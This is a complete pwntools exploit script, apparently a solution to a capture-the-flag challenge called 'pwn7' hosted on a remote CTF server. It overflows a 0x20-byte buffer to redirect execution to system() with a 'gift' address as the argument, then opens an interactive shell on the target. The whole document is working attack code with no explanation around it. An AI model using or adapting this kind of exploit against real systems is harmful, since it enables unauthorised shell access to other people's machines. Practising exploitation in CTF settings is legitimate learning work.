from pwn import *
context.log_level='debug'
context_terminal=['gnome-terminal','-x','sh','-c']

p=process('./pwn7')
p=remote("ctf.nefu.edu.cn",32946)
elf=ELF('./pwn7')
if args.G:
	gdb.attach(p)
	pause()

system=elf.plt['system']
gift=0x0804852e
p.recvuntil('sh')
payload=b'a'*0x20+p32(system)+b'aaaa'+p32(gift)
print(len(payload))
p.sendline(payload)
p.interactive()

